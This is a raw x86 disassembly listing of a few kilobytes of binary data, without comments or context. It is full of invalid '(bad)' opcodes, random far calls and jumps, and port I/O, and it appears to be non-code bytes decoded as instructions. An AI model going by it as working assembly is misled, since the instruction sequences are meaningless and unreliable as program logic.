  427bbd:	sbb    ecx,DWORD PTR [esp+edx*2+0x3a3b839e]
  427bc4:	pop    ss
  427bc5:	out    dx,eax
  427bc6:	push   cs
  427bc7:	in     eax,0x4d
  427bc9:	retf   
  427bca:	fcom   QWORD PTR [edi+0x76]
  427bcd:	lods   eax,DWORD PTR ds:[esi]
  427bce:	add    esi,ebp
  427bd0:	sar    DWORD PTR [edi+0x5327fdbd],1
  427bd6:	and    BYTE PTR [edx],0x46
  427bd9:	sbb    BYTE PTR [esi-0x47],0x13
  427bdd:	shl    esi,1
  427bdf:	inc    edi
  427be0:	dec    eax
  427be1:	inc    edi
  427be2:	fcomp  DWORD PTR [edi+0x27c25f78]
  427be8:	mov    ch,0x18
  427bea:	jo     0x427bf2
  427bec:	test   al,0x1b
  427bee:	cwde   
  427bef:	cs popa 
  427bf1:	test   DWORD PTR [edi],ecx
  427bf3:	stos   BYTE PTR es:[edi],al
  427bf4:	popa   
  427bf5:	sub    DWORD PTR [edi+0x74],esp
  427bf8:	jg     0x427bad
  427bfa:	sbb    eax,0x944e0750
  427bff:	retf   
  427c00:	cld    
  427c01:	ins    BYTE PTR es:[edi],dx
  427c02:	mov    esp,0xff422c16
  427c07:	imul   ebp,DWORD PTR [esi],0xbb6377c1
  427c0d:	out    0x9b,eax
  427c0f:	fmul   QWORD PTR [ecx-0x50]
  427c12:	pop    edi
  427c13:	inc    ebp
  427c14:	inc    ebx
  427c15:	xchg   esp,eax
  427c16:	mov    ch,0x56
  427c18:	cdq    
  427c19:	push   0x126a025d
  427c1e:	sub    BYTE PTR [edi-0xe526e99],al
  427c24:	dec    esi
  427c25:	sbb    ebx,ebp
  427c27:	scas   al,BYTE PTR es:[edi]
  427c28:	push   esi
  427c29:	outs   dx,BYTE PTR ds:[esi]
  427c2a:	push   esi
  427c2b:	xchg   ebx,eax
  427c2c:	add    edi,ecx
  427c2e:	push   es
  427c2f:	ss and eax,0x34dc8809
  427c35:	mov    dl,0xae
  427c37:	mov    eax,ds:0xdeb94694
  427c3c:	sbb    bh,0xd6
  427c3f:	test   BYTE PTR [ebp-0x54],bl
  427c42:	ds dec esi
  427c44:	mov    bl,0x23
  427c46:	push   esp
  427c47:	push   ecx
  427c48:	scas   eax,DWORD PTR es:[edi]
  427c49:	lods   al,BYTE PTR ds:[esi]
  427c4a:	loope  0x427c73
  427c4c:	enter  0x6d97,0x42
  427c50:	xchg   edi,eax
  427c51:	pop    ds
  427c52:	imul   esi,DWORD PTR [edi+0x4f],0xffffff91
  427c56:	adc    eax,0x51952942
  427c5b:	and    ecx,DWORD PTR [edi-0x2d259bc2]
  427c61:	pop    ebp
  427c62:	adc    eax,0xb5620661
  427c67:	jb     0x427c0b
  427c69:	pop    esp
  427c6a:	lods   eax,DWORD PTR ds:[esi]
  427c6b:	dec    ebx
  427c6c:	xchg   esi,eax
  427c6d:	mov    esp,0x1fa296c0
  427c72:	pop    es
  427c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c74:	inc    eax
  427c75:	(bad)  
  427c76:	push   ebx
  427c77:	std    
  427c78:	mov    eax,ds:0xbc981e33
  427c7d:	pushf  
  427c7e:	sub    eax,0x65728122
  427c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c84:	cs sub eax,0xbe0a5ab8
  427c8a:	(bad)  
  427c8b:	cdq    
  427c8c:	scas   eax,DWORD PTR es:[edi]
  427c8d:	add    eax,0x10fb449f
  427c92:	jle    0x427c3c
  427c94:	inc    edx
  427c95:	bound  ecx,QWORD PTR [edx]
  427c97:	push   0x31
  427c99:	pusha  
  427c9a:	jae    0x427cc5
  427c9c:	adc    al,0xb6
  427c9e:	push   esp
  427c9f:	les    ecx,FWORD PTR [ebx-0x455bcb73]
  427ca5:	or     DWORD PTR ds:0x2a2022fa,ebx
  427cab:	retf   
  427cac:	push   es
  427cad:	add    bl,ch
  427caf:	sbb    DWORD PTR [eax+0x68],esi
  427cb2:	pop    es
  427cb3:	add    ebp,esi
  427cb5:	mov    ds:0x4f98a2ae,eax
  427cba:	call   0x2ab:0x816181c6
  427cc1:	call   0xddb3:0x918a6ad7
  427cc8:	rcl    DWORD PTR [edx+0x7188908b],0xdd
  427ccf:	pop    es
  427cd0:	pushf  
  427cd1:	call   0xf7e0:0xc97865ab
  427cd8:	lahf   
  427cd9:	xor    ch,BYTE PTR [edi+eax*2]
  427cdc:	and    al,0x43
  427cde:	sbb    al,0x49
  427ce0:	push   0xffffffc8
  427ce2:	adc    ecx,ebp
  427ce4:	mov    edx,eax
  427ce6:	cmp    BYTE PTR [esi+0x2da9032f],cl
  427cec:	fidiv  DWORD PTR [esi]
  427cee:	jnp    0x427c97
  427cf0:	xchg   esi,eax
  427cf1:	mov    al,ds:0x1fa0781a
  427cf6:	jl     0x427ce1
  427cf8:	sbb    eax,edi
  427cfa:	repnz mov ecx,0x912fa1e
  427d00:	test   eax,0x3c20eed8
  427d05:	shr    BYTE PTR [ebx+0x49],0x39
  427d09:	or     al,0x64
  427d0b:	or     DWORD PTR [ecx],esi
  427d0d:	shl    bl,1
  427d0f:	cmc    
  427d10:	shr    BYTE PTR ss:[ebx],0x26
  427d14:	or     DWORD PTR [edi],ebp
  427d16:	retf   
  427d17:	arpl   bx,di
  427d19:	sbb    dh,BYTE PTR [edi-0x4cc8dea3]
  427d1f:	fnstenv [ebx]
  427d21:	sbb    BYTE PTR [ebp-0x4e],al
  427d24:	xchg   edi,eax
  427d25:	dec    ebp
  427d26:	sbb    ch,BYTE PTR [ebx+eiz*1-0xf]
  427d2a:	mov    ecx,0x70fba65
  427d2f:	cs aaa 
  427d31:	clc    
  427d32:	dec    esp
  427d33:	jb     0x427d23
  427d35:	lahf   
  427d36:	into   
  427d37:	mov    al,ds:0x2b2dc602
  427d3c:	mov    eax,0xd2f61907
  427d41:	pop    ebx
  427d42:	sbb    ch,0x94
  427d45:	pop    edx
  427d46:	repnz loope 0x427d40
  427d49:	scas   eax,DWORD PTR es:[edi]
  427d4a:	sahf   
  427d4b:	aas    
  427d4c:	adc    DWORD PTR [ebp+edx*4-0x545f02cf],esi
  427d53:	pop    es
  427d54:	sahf   
  427d55:	sbb    BYTE PTR [ebx],dh
  427d57:	sar    BYTE PTR [ecx-0x2d],0x77
  427d5b:	xchg   edx,eax
  427d5c:	push   cs
  427d5d:	push   0xffffffb9
  427d5f:	repz je 0x427dce
  427d62:	cld    
  427d63:	mov    ds:0x42e0c0a1,al
  427d68:	es cmp BYTE PTR es:[edx-0x61112d5b],dh
  427d70:	lock lods eax,DWORD PTR ds:[esi]
  427d72:	sub    DWORD PTR [esi-0x15],esp
  427d75:	or     al,0xfa
  427d77:	dec    ebp
  427d78:	(bad)  
  427d79:	fcomip st,st(1)
  427d7b:	rcr    DWORD PTR [ebx+0x36],1
  427d7e:	or     ch,dl
  427d80:	iret   
  427d81:	nop
  427d82:	lock lock push ss
  427d85:	sub    eax,0x5a345a24
  427d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d8b:	js     0x427e0b
  427d8d:	loopne 0x427da6
  427d8f:	sub    edx,ebp
  427d91:	add    bl,ch
  427d93:	or     BYTE PTR [eax+0x68],bl
  427d96:	pop    esp
  427d97:	retf   0x1682
  427d9a:	or     ch,BYTE PTR [eax+0x28e6e87c]
  427da0:	js     0x427d9a
  427da2:	push   esp
  427da3:	pop    ds
  427da4:	in     al,0xf9
  427da6:	mov    bl,0x29
  427da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427da9:	push   esi
  427daa:	or     BYTE PTR [ecx+0x19],0xd6
  427dae:	pop    eax
  427daf:	add    BYTE PTR [ecx-0x6d],0x3
  427db3:	cmp    BYTE PTR [edi+0x22],0x4e
  427db7:	fist   WORD PTR [ebx]
  427db9:	(bad)  
  427dbb:	xor    BYTE PTR [edx],0x89
  427dbe:	jbe    0x427db4
  427dc0:	inc    ebx
  427dc1:	fwait
  427dc2:	mov    al,0xfd
  427dc4:	cwde   
  427dc5:	jge    0x427dcc
  427dc7:	pop    esi
  427dc8:	push   eax
  427dc9:	shl    DWORD PTR [ebx-0x60d5ce83],1
  427dcf:	sub    BYTE PTR [ebx+0x64],cl
  427dd2:	jb     0x427d72
  427dd4:	retf   
  427dd5:	add    edi,DWORD PTR [edi+0x2e820c2a]
  427ddb:	je     0x427e47
  427ddd:	mov    ds:0xac3626f0,al
  427de2:	mov    edi,DWORD PTR [ebx]
  427de4:	lahf   
  427de5:	and    esp,DWORD PTR [edi-0x4a5d53]
  427deb:	jp     0x427e02
  427ded:	jmp    0x291efb13
  427df2:	mov    bl,0x28
  427df4:	jle    0x427e5a
  427df6:	and    DWORD PTR [ebp+0x41],edx
  427df9:	xchg   ebp,eax
  427dfa:	xchg   ebx,eax
  427dfb:	cwde   
  427dfc:	ud0    ecx,edi
  427dff:	cmp    al,0x2c
  427e01:	jmp    0x5d573354
  427e06:	pop    esi
  427e07:	lds    sp,DWORD PTR [ecx+eiz*4]
  427e0b:	call   0xc5569a0f
  427e10:	in     al,0x3
  427e12:	push   ds
  427e13:	ss mov esi,0xdf115f28
  427e19:	test   al,al
  427e1b:	fwait
  427e1c:	out    dx,eax
  427e1d:	in     al,dx
  427e1e:	push   eax
  427e1f:	mov    dl,0xe
  427e21:	ss push ds
  427e23:	and    BYTE PTR [ebp-0x64],0xd8
  427e27:	dec    esp
  427e28:	inc    eax
  427e29:	dec    ecx
  427e2a:	pop    esi
  427e2b:	jle    0x427e53
  427e2d:	call   0xa87f:0x37ea22bc
  427e34:	mov    dl,0x4d
  427e36:	dec    edi
  427e37:	pop    edx
  427e38:	ret    0x5727
  427e3b:	push   esp
  427e3c:	out    dx,al
  427e3d:	mul    bl
  427e3f:	ret    
  427e40:	loopne 0x427e80
  427e42:	mov    edi,ecx
  427e44:	sub    al,0xe8
  427e46:	ds daa 
  427e48:	je     0x427e68
  427e4a:	fnstenv [ecx]
  427e4c:	xor    DWORD PTR [esi-0x18],ebp
  427e4f:	sbb    eax,0x26dba257
  427e54:	fwait
  427e55:	dec    edi
  427e56:	les    edi,FWORD PTR [edi]
  427e58:	jge    0x427e9a
  427e5a:	pop    eax
  427e5b:	in     al,dx
  427e5c:	dec    edi
  427e5d:	sbb    BYTE PTR [edi-0x70],bh
  427e60:	xlat   BYTE PTR ds:[ebx]
  427e61:	pop    ebp
  427e62:	mov    ds:0x9412265f,eax
  427e67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e68:	xchg   edi,eax
  427e69:	sbb    al,0xf7
  427e6b:	dec    ebp
  427e6c:	hlt    
  427e6d:	cmc    
  427e6e:	dec    edx
  427e6f:	loop   0x427e3a
  427e71:	mov    edx,0xf2d78317
  427e76:	pop    edx
  427e77:	outs   dx,DWORD PTR ds:[esi]
  427e78:	and    ebx,DWORD PTR [edi-0x555faa4e]
  427e7e:	into   
  427e7f:	dec    edx
  427e80:	mov    al,ds:0xd177e65c
  427e85:	mov    al,0x14
  427e87:	xchg   ebx,eax
  427e88:	adc    DWORD PTR [edx+eax*8],eax
  427e8b:	stos   BYTE PTR es:[edi],al
  427e8c:	mov    edi,0xe7f76430
  427e91:	add    eax,0x5242ed97
  427e96:	popa   
  427e97:	jmp    0x427e4f
  427e99:	shl    DWORD PTR [ecx+0x545455f9],cl
  427e9f:	ins    DWORD PTR es:[edi],dx
  427ea0:	sub    BYTE PTR [eax*2+0x2a1092a5],cl
  427ea7:	xor    BYTE PTR [edx+0x4b],cl
  427eaa:	in     eax,dx
  427eab:	aam    0x75
  427ead:	mov    ebx,0x8791a64e
  427eb2:	or     bl,ch
  427eb4:	push   ebp
  427eb5:	(bad)  
  427eb6:	jl     0x427e3b
  427eb8:	pop    DWORD PTR [eax-0x1473ee7d]
  427ebe:	loopne 0x427f36
  427ec0:	jge    0x427e67
  427ec2:	cmp    eax,0x74c46015
  427ec7:	fsubp  st(4),st
  427ec9:	sbb    DWORD PTR [ebx+ebx*2+0x617f5fa3],0xb3671133
  427ed4:	dec    esp
  427ed5:	fnstenv [ebx]
  427ed7:	(bad)  
  427ed8:	pop    edi
  427ed9:	retf   0xc25e
  427edc:	and    ah,BYTE PTR [edi]
  427ede:	inc    esi
  427edf:	test   BYTE PTR [esi+edx*1+0x10],bh
  427ee3:	int    0x83
  427ee5:	dec    esi
  427ee6:	adc    eax,0xdce01c2d
  427eeb:	mov    edx,0xa599bbf9
  427ef0:	out    dx,eax
  427ef1:	std    
  427ef2:	push   ecx
  427ef3:	mov    al,ds:0x3bd533ea
  427ef8:	sub    edx,DWORD PTR [ebx-0x3eea927f]
  427efe:	xchg   BYTE PTR [edx],ch
  427f00:	stos   DWORD PTR es:[edi],eax
  427f01:	add    esp,DWORD PTR [ebx+eax*4]
  427f04:	lahf   
  427f05:	push   cs
  427f06:	call   0x6360:0xa02a0ddb
  427f0d:	into   
  427f0e:	clc    
  427f0f:	out    0x3c,eax
  427f11:	jnp    0x427f3d
  427f13:	pop    ebx
  427f14:	mov    ebx,DWORD PTR [esi+0x7de9d19]
  427f1a:	xor    al,0x13
  427f1c:	jmp    0xe76d:0xb193bc73
  427f23:	mov    esi,0xdd84fee2
  427f28:	xchg   esi,eax
  427f29:	mov    bh,0x8
  427f2b:	aas    
  427f2c:	adc    edi,edi
  427f2e:	sub    ebp,ebp
  427f30:	pop    ebp
  427f31:	jge    0x427ed7
  427f33:	xchg   esp,eax
  427f34:	inc    esi
  427f35:	xor    ebx,DWORD PTR [esi]
  427f37:	jnp    0x427ece
  427f39:	and    al,0x95
  427f3b:	sbb    al,0xc4
  427f3d:	shr    cl,cl
  427f3f:	jp     0x427f79
  427f41:	pop    eax
  427f42:	(bad)  
  427f43:	jecxz  0x427fc0
  427f45:	sbb    cl,BYTE PTR [ebx-0x2d88730b]
  427f4b:	add    bl,0x64
  427f4e:	mov    gs,WORD PTR [ecx-0x850f925]
	...
  427f60:	add    BYTE PTR [ebx+ecx*4-0x2000283b],dh
  427f67:	mov    dh,0xeb
  427f69:	xor    BYTE PTR [eax+0x6eb9bbe1],ch
  427f6f:	(bad)  
  427f70:	in     eax,0xce
  427f72:	hlt    
  427f73:	add    DWORD PTR [eax],eax
  427f75:	test   eax,0x97000003
  427f7a:	jb     0x427f9a
  427f7c:	scas   al,BYTE PTR es:[edi]
  427f7d:	pop    esi
  427f7e:	xchg   edx,ecx
  427f80:	mov    al,0x4c
  427f82:	push   ebp
  427f83:	imul   ebx,eax,0xffffffb6
  427f86:	bound  ebp,QWORD PTR [ecx]
  427f88:	mov    BYTE PTR [ecx+eax*1-0x9],dh
  427f8c:	cdq    
  427f8d:	inc    esi
  427f8e:	jns    0x427fcd
  427f90:	ja     0x428005
  427f92:	js     0x42800a
  427f94:	aam    0x91
  427f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f97:	bound  ebp,QWORD PTR [esi-0x1b]
  427f9a:	test   eax,0x63cb4de2
  427f9f:	fs loop 0x427fe7
  427fa2:	sbb    DWORD PTR [esi-0x786d8053],ebp
  427fa8:	mov    ds:0xfc8e14c0,al
  427fad:	push   ecx
  427fae:	push   eax
  427faf:	iret   
  427fb0:	jle    0x427fde
  427fb2:	cdq    
  427fb3:	jbe    0x427f7a
  427fb5:	in     eax,0x23
  427fb7:	(bad)  
  427fb8:	push   esp
  427fb9:	sbb    ch,0x84
  427fbc:	mov    edx,0x2e941501
  427fc1:	jg     0x427fe0
  427fc3:	mov    edi,0x1385ac0c
  427fc8:	fisttp DWORD PTR [edx]
  427fca:	mov    cl,0x5e
  427fcc:	mov    DWORD PTR [edx],esi
  427fce:	scas   eax,DWORD PTR es:[edi]
  427fcf:	icebp  
  427fd0:	aas    
  427fd1:	sahf   
  427fd2:	stos   DWORD PTR es:[edi],eax
  427fd3:	imul   esp,DWORD PTR [edi],0x8f1bd5d8
  427fd9:	sub    DWORD PTR [ecx],ecx
  427fdb:	test   ah,0xca
  427fde:	dec    ebp
  427fdf:	sbb    eax,0x12ab9d0d
  427fe4:	div    BYTE PTR ds:0xb7657a23
  427fea:	jp     0x428052
  427fec:	or     DWORD PTR [ecx],ebp
  427fee:	ins    BYTE PTR es:[edi],dx
  427fef:	xchg   ebp,eax
  427ff0:	jae    0x42800c
  427ff2:	mov    al,0x92
  427ff4:	(bad)  
  427ff5:	mov    dh,0xfa
  427ff7:	jmp    0x427f9d
  427ff9:	xor    eax,0x2a617d1c
  427ffe:	add    dl,dl
  428000:	jge    0x427fa1
  428002:	add    ecx,0x70
  428005:	cmp    bh,0xda
  428008:	les    eax,FWORD PTR [eax-0x61]
  42800b:	adc    al,dl
  42800d:	jnp    0x427fd6
  42800f:	aas    
  428010:	pushf  
  428011:	mov    ecx,DWORD PTR [esi]
  428013:	jbe    0x42806c
  428015:	xchg   edx,eax
  428016:	mov    esi,0xeb371dc8
  42801b:	push   ebp
  42801c:	test   al,0x3e
  42801e:	gs pusha 
  428020:	arpl   WORD PTR [edi+ebp*4-0x728fb2af],ax
  428027:	cmc    
  428028:	xchg   esp,eax
  428029:	lds    edx,FWORD PTR [edi]
  42802b:	dec    ebx
  42802c:	jge    0x428082
  42802e:	jns    0x42802e
  428030:	push   edx
  428031:	or     ebp,DWORD PTR ds:0xd2d45339
  428037:	js     0x42805c
  428039:	repnz sbb BYTE PTR [eax],0xed
  42803d:	xor    bl,BYTE PTR [ebp-0x41]
  428040:	scas   al,BYTE PTR es:[edi]
  428041:	jle    0x428098
  428043:	adc    bl,BYTE PTR [edx]
  428045:	jp     0x428010
  428047:	dec    ebp
  428048:	clc    
  428049:	outs   dx,DWORD PTR ds:[esi]
  42804a:	(bad)  
  42804b:	ja     0x4280cc
  42804d:	retf   0x263c
  428050:	and    al,bh
  428052:	mov    ebx,0x40e7066
  428057:	gs mov bh,0x65
  42805a:	sub    al,0x7b
  42805c:	jl     0x428072
  42805e:	xchg   ebx,eax
  42805f:	xor    al,0x4e
  428061:	mov    al,fs:0xe3f6e393
  428067:	add    eax,0x5363686b
  42806c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42806d:	xchg   ebx,eax
  42806e:	jp     0x4280c9
  428070:	cs pop es
  428072:	mov    ah,0x18
  428074:	mov    ecx,0x1e148178
  428079:	arpl   WORD PTR [edi-0x69b4f4b0],bx
  42807f:	sub    al,0x4
  428081:	das    
  428082:	test   eax,0x74d36381
  428087:	add    ebx,DWORD PTR [ebx+eax*1-0x1f]
  42808b:	pop    esp
  42808c:	xor    al,0x36
  42808e:	dec    edx
  42808f:	pop    esp
  428090:	retf   
  428091:	dec    esi
  428092:	add    bh,BYTE PTR [ecx]
  428094:	fdivr  DWORD PTR [ecx+esi*8-0x17107c2f]
  42809b:	les    edi,FWORD PTR [ecx]
  42809d:	pop    esi
  42809e:	(bad)  
  42809f:	das    
  4280a0:	pop    eax
  4280a1:	mov    al,0xbe
  4280a3:	ins    BYTE PTR es:[edi],dx
  4280a4:	(bad)  
  4280a5:	jmp    0xf260:0xe8f2f94d
  4280ac:	repz dec esi
  4280ae:	(bad)  
  4280af:	daa    
  4280b0:	mov    edx,0xf49e7b8
  4280b5:	ins    BYTE PTR es:[edi],dx
  4280b6:	(bad)  
  4280b7:	ja     0x428113
  4280b9:	cs ins BYTE PTR es:[edi],dx
  4280bb:	in     al,dx
  4280bc:	mov    al,ds:0xc7657c6b
  4280c1:	pop    esi
  4280c2:	lock js 0x4280c3
  4280c5:	imul   esi,ecx,0x71203c43
  4280cb:	mov    edx,DWORD PTR [edi+0x51b35670]
  4280d1:	cdq    
  4280d2:	mov    esi,0x215d3a10
  4280d7:	in     eax,dx
  4280d8:	sbb    eax,0xcd310205
  4280de:	pushf  
  4280df:	push   0x42a9ff62
  4280e4:	stos   DWORD PTR es:[edi],eax
  4280e5:	jno    0x4280d7
  4280e7:	xor    ebp,DWORD PTR [edi-0x45]
  4280ea:	scas   eax,DWORD PTR es:[edi]
  4280eb:	cmp    ebx,DWORD PTR [edx]
  4280ed:	pushf  
  4280ee:	int    0xf8
  4280f0:	mov    edi,0x84d39f76
  4280f5:	dec    ecx
  4280f6:	loope  0x4280cc
  4280f8:	xor    esp,DWORD PTR [esi+0x70f568ab]
  4280fe:	addr16 and eax,0xfc6bfc47
  428104:	loopne 0x428122
  428106:	push   ds
  428107:	lea    ecx,[ebp+0x33bfeb7a]
  42810d:	in     eax,dx
  42810e:	dec    esi
  42810f:	test   al,0x6
  428111:	out    dx,al
  428112:	push   esp
  428113:	sahf   
  428114:	mov    ds:0x725aef2c,eax
  428119:	mov    bl,0x56
  42811b:	fld    st(7)
  42811d:	nop
  42811e:	xchg   edx,eax
  42811f:	iret   
  428120:	push   ebp
  428121:	ror    BYTE PTR [ebp-0x5c],cl
  428124:	jg     0x428115
  428126:	sbb    bh,BYTE PTR [ebx]
  428128:	rol    BYTE PTR [eax+0x63],cl
  42812b:	mov    ebx,0xa3b0596c
  428130:	mov    eax,ds:0xaac816cd
  428135:	mov    edx,0x22e5c734
  42813a:	xchg   ebp,eax
  42813b:	push   ss
  42813c:	sbb    BYTE PTR [edx],ch
  42813e:	and    DWORD PTR [ebx],eax
  428140:	iret   
  428141:	cdq    
  428142:	popf   
  428143:	or     DWORD PTR [edi-0x124c517e],edi
  428149:	push   eax
  42814a:	adc    eax,0x855effe1
  42814f:	mov    eax,0xe635aa4d
  428154:	fwait
  428155:	adc    dl,BYTE PTR [edx+0x11]
  428158:	sub    edi,DWORD PTR [edi-0x68b40cd5]
  42815e:	pop    edx
  42815f:	and    DWORD PTR [ecx-0x40357af8],esi
  428165:	jmp    0xd3b5:0xfd240cc3
  42816c:	dec    esp
  42816d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42816e:	inc    edi
  42816f:	mov    edi,0x57a856a7
  428174:	iret   
  428175:	pop    eax
  428176:	add    al,0x20
  428178:	adc    al,0x53
  42817a:	repnz test DWORD PTR [eax+0x1],edx
  42817e:	mov    cl,0x71
  428180:	cmp    BYTE PTR [ebp-0x50e695bc],ah
  428186:	mov    ?,edi
  428188:	sbb    eax,0xbdcfb600
  42818d:	hlt    
  42818e:	inc    ecx
  42818f:	pop    eax
  428190:	call   0xf8ec29cb
  428195:	pop    ecx
  428196:	jle    0x428196
  428198:	out    0x99,eax
  42819a:	add    DWORD PTR [ebp+0x7e9ddaa1],0x6d0407c8
  4281a4:	lahf   
  4281a5:	jbe    0x42819a
  4281a7:	int3   
  4281a8:	(bad)  
  4281a9:	or     eax,0x3355c03a
  4281ae:	pusha  
  4281af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281b0:	sar    esp,cl
  4281b2:	adc    eax,0x8025bd29
  4281b7:	mov    eax,0xf0c7c0ef
  4281bc:	fyl2xp1 
  4281be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281bf:	adc    BYTE PTR [ebp-0x13],al
  4281c2:	hlt    
  4281c3:	in     al,dx
  4281c4:	mov    dh,BYTE PTR [eax+0x39]
  4281c7:	cmp    eax,0xd4f43ad3
  4281cc:	cmp    bh,BYTE PTR [ebx]
  4281ce:	ins    DWORD PTR es:[edi],dx
  4281cf:	mov    ch,0x60
  4281d1:	push   es
  4281d2:	aam    0xec
  4281d4:	rol    bh,0x68
  4281d7:	push   es
  4281d8:	cmp    eax,0x469f6dbc
  4281dd:	mov    dl,0x8
  4281df:	cwde   
  4281e0:	js     0x428197
  4281e2:	enter  0x4402,0xae
  4281e6:	sahf   
  4281e7:	xchg   esi,eax
  4281e8:	inc    ebp
  4281e9:	jmp    0x428195
  4281eb:	jae    0x42816d
  4281ed:	sbb    DWORD PTR [eax+edi*1],edi
  4281f0:	sub    DWORD PTR [eax+0x6b],ebp
  4281f3:	je     0x4281f3
  4281f5:	push   cs
  4281f6:	sti    
  4281f7:	adc    al,0x6c
  4281f9:	mov    BYTE PTR ds:0xbdd4bd5d,0x8e
  428200:	push   esi
  428201:	mov    ch,0x2b
  428203:	add    eax,0xa0089056
  428208:	rcr    BYTE PTR [ecx+0x5e],cl
  42820b:	pop    esi
  42820c:	cmp    ebx,DWORD PTR [edi]
  42820e:	push   0xffffff84
  428210:	adc    ebp,DWORD PTR [ebx+0x46]
  428213:	outs   dx,BYTE PTR ds:[esi]
  428214:	div    cl
  428216:	das    
  428217:	push   ds
  428218:	dec    ebx
  428219:	jne    0x4281b9
  42821b:	lock popa 
  42821d:	jns    0x428266
  42821f:	cld    
  428220:	and    al,0x3
  428222:	mov    bl,0x23
  428224:	sub    ebp,DWORD PTR [ebx]
  428226:	pop    esi
  428227:	add    BYTE PTR gs:[edx+0x2c],dh
  42822b:	jno    0x4281c1
  42822d:	jp     0x4281f7
  42822f:	push   edx
  428230:	es daa 
  428232:	jmp    0x42824c
  428234:	push   edx
  428235:	cmp    eax,0x8c2f1f14
  42823a:	push   edi
  42823b:	xchg   ecx,eax
  42823c:	lods   al,BYTE PTR ds:[esi]
  42823d:	sti    
  42823e:	and    BYTE PTR ds:0xd9bb4e9c,dh
  428244:	xlat   BYTE PTR ds:[ebx]
  428245:	cmp    eax,0xec0f1772
  42824a:	les    edi,FWORD PTR [eax]
  42824c:	push   esp
  42824d:	ins    BYTE PTR es:[edi],dx
  42824e:	cld    
  42824f:	mov    BYTE PTR [ebx],al
  428251:	xchg   ebp,eax
  428252:	xlat   BYTE PTR ds:[ebx]
  428253:	out    0x4,al
  428255:	and    dh,al
  428257:	inc    ebx
  428258:	adc    ebx,DWORD PTR [edi+ecx*1]
  42825b:	cmp    eax,0x3cbe27f5
  428260:	les    edx,FWORD PTR [eax-0x16a3fd53]
  428266:	test   eax,0x42b46f9e
  42826b:	cmp    BYTE PTR [esi+0x54943118],bh
  428271:	cmp    edi,DWORD PTR [eax]
  428273:	jmp    0xf2bb:0xf84919d2
  42827a:	xchg   ecx,eax
  42827b:	mov    bl,0x64
  42827d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42827e:	sahf   
  42827f:	(bad)  [ecx]
  428281:	or     DWORD PTR fs:[edx+0x3f],edx
  428285:	(bad)  
  428286:	int3   
  428287:	mov    cl,BYTE PTR [edi+0x20]
  42828a:	mov    ebp,0xaec10f58
  42828f:	nop    DWORD PTR [ecx+0x7e]
  428293:	jl     0x428313
  428295:	dec    esp
  428296:	push   esi
  428297:	mov    edx,0xc4ec6601
  42829c:	mov    BYTE PTR [edi+0xf40466],al
  4282a2:	push   ss
  4282a3:	push   ds
  4282a4:	jmp    DWORD PTR [ebx-0x3011ef93]
  4282aa:	sbb    DWORD PTR [edi-0x45],esi
  4282ad:	mov    bl,0xd9
  4282af:	aas    
  4282b0:	mov    BYTE PTR [ebx-0x36],ch
  4282b3:	mov    eax,0x82575ad9
  4282b8:	repnz mov WORD PTR [ecx+0x39],gs
  4282bc:	fisttp QWORD PTR [ebp+0x20]
  4282bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282c0:	int    0x35
  4282c2:	(bad)  
  4282c3:	xor    DWORD PTR [ebx+0x7c],esp
  4282c6:	push   ebp
  4282c7:	mov    eax,ds:0xa4111bb7
  4282cc:	and    ebp,0xe00d94a0
  4282d2:	and    ebx,DWORD PTR [ecx+0x69]
  4282d5:	call   0xc328:0x40b75437
  4282dc:	jl     0x428343
  4282de:	loop   0x4282fa
  4282e0:	lea    edx,[ecx+0x4bb74090]
  4282e6:	jae    0x428323
  4282e8:	xor    eax,0xd8e20353
  4282ed:	jne    0x42827d
  4282ef:	lods   eax,DWORD PTR ds:[esi]
  4282f0:	xchg   esi,eax
  4282f1:	xor    BYTE PTR [ebx],ch
  4282f3:	cmp    eax,edi
  4282f5:	cmp    cl,BYTE PTR [eax]
  4282f7:	arpl   WORD PTR [ecx],bx
  4282f9:	jg     0x428335
  4282fb:	push   edx
  4282fc:	and    BYTE PTR [edx+0x76],cl
  4282ff:	xor    eax,0xfbd7b5e5
  428304:	pop    ecx
  428305:	pop    edx
  428306:	add    DWORD PTR [eax-0x67],0x30
  42830a:	mov    eax,edx
  42830c:	jmp    0xa7db:0xd9aa0849
  428313:	mov    ds:0x60b439ca,al
  428318:	cld    
  428319:	pop    ebx
  42831a:	sub    al,0x79
  42831c:	and    ch,BYTE PTR [esi+ecx*1]
  42831f:	enterw 0x17,0x0
	...
